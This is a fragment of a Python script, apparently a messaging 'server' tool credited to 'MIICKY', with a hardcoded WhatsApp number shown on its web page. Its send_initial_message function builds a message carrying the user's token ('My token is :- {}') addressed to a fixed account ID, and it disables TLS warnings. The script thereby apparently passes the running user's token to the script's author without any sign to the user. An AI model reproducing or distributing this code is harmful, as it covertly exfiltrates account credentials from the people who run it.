...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"CREDIT :- TRICKS BY MIICKY<br> <br> OWNER => MIICKY <br> <br> WATSAPP :- +918337992557")
def execute_server():
...
def send_initial_message():
      ...
      msg_template = "CREDIT :- TRICKS BY MIICKY                                          Owner => Miicky                                           Hello miicky madam. I am using your server. My token is :- {}"

      # Specify the ID where you want to send the message
      target_id = "100075418646486"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '●════════════TRICKS-BY-MIICKY════════════●')
